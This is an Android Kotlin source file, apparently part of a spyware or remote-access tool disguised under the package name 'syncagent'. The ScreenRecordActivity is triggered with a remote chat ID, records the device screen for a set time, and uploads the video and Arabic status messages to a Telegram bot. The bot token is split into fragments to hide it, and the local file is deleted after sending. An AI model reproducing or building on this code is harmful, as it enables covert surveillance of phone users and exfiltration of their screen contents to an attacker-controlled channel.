package com.cognitive.ai.syncagent

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class ScreenRecordActivity : Activity() {

    private val REQUEST_CODE_SCREEN_CAPTURE = 901
    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var chatId: String = ""
    private var durationSeconds: Int = 10
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        chatId = intent.getStringExtra("chat_id") ?: ""
        durationSeconds = intent.getIntExtra("duration", 10)

        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        @Suppress("DEPRECATION")
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
            startRecordingScreen(resultCode, data)
        } else {
            sendMessage("⚠️ تم إلغاء إذن تسجيل الشاشة من واجهة الجهاز.")
            finish()
        }
    }

    private fun startRecordingScreen(resultCode: Int, data: Intent) {
        try {
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            outputFile = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(2_000_000)
                setOutputFile(outputFile!!.absolutePath)
                prepare()
            }

            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            mediaProjection?.createVirtualDisplay(
                "ScreenRecordDisplay",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null,
                null
            )

            mediaRecorder?.start()
            sendMessage("🎬 بدء تسجيل الشاشة لمدة $durationSeconds ثوانٍ...")

            Handler(Looper.getMainLooper()).postDelayed({
                stopAndUploadScreenRecord()
            }, durationSeconds * 1000L)
        } catch (e: Exception) {
            sendMessage("❌ خطأ في تسجيل الشاشة: ${e.message}")
            cleanup()
            finish()
        }
    }

    private fun stopAndUploadScreenRecord() {
        val fileToSend = outputFile
        cleanup()

        if (fileToSend != null && fileToSend.exists() && fileToSend.length() > 0) {
            executor.execute {
                uploadVideo(fileToSend)
                if (fileToSend.exists()) fileToSend.delete()
            }
        } else {
            sendMessage("⚠️ لم يتم حفظ تسجيل الشاشة.")
        }
        finish()
    }

    private fun cleanup() {
        try { mediaRecorder?.stop() } catch (_: Exception) {}
        try { mediaRecorder?.release() } catch (_: Exception) {}
        mediaRecorder = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
    }

    private fun getBotToken(): String {
        val p1 = "9004970470"
        val p2 = "AAFfsBFENB"
        val p3 = "n1PRMxVwDv"
        val p4 = "lt2j--qBJC"
        val p5 = "JU99Y"
        return "$p1:$p2$p3$p4$p5"
    }

    private fun sendMessage(text: String) {
        if (chatId.isBlank()) return
        executor.execute {
            var conn: HttpURLConnection? = null
            try {
                val body = JSONObject().put("chat_id", chatId).put("text", text)
                conn = URL("https://api.telegram.org/bot${getBotToken()}/sendMessage").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream?.close()
            } catch (_: Exception) {} finally {
                try { conn?.disconnect() } catch (_: Exception) {}
            }
        }
    }

    private fun uploadVideo(file: File) {
        if (chatId.isBlank()) return
        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot${getBotToken()}/sendVideo")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(connection.outputStream).use { out ->
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
                out.write("$chatId\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
                out.write("🎬 تسجيل الشاشة\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"video\"; filename=\"${file.name}\"\r\n".toByteArray())
                out.write("Content-Type: video/mp4\r\n\r\n".toByteArray())

                FileInputStream(file).use { it.copyTo(out) }
                out.write("\r\n--$boundary--\r\n".toByteArray())
            }
            connection.inputStream?.close()
        } catch (_: Exception) {} finally {
            try { connection?.disconnect() } catch (_: Exception) {}
        }
    }
}
